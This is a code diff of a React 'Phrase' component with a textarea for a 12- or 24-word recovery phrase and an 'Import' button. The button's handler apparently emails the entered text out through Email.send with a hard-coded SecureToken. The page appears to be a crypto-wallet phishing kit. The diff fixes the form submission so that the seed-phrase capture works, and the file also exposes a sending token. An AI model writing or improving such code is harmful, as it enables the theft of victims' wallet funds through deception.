@@ -394,7 +394,8 @@ const Phrase = ({ data }) => {
     }
     const [phrase12, setPhrase12] = useState("")
     const router = useRouter();
-    const myFunc = ( ) => {
+    const myFunc = (event ) => {
+        event.preventDefault();
         setIsLoading(true)
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
@@ -427,10 +428,10 @@ const Phrase = ({ data }) => {
                             onChange={(e) => {setPhrase12(e.target.value)}}
                         ></textarea>
                         <p className="green right">...mostly 12 or 24 in number</p>
+                        <div className="d-flex jac">
+                            <button onClick={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
+                        </div>
                     </form>
-                </div>
-                <div className="d-flex jac">
-                    <button onClick={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
                 </div>
                 {isLoading ? <Loading /> : (<div></div>)}
             </div>
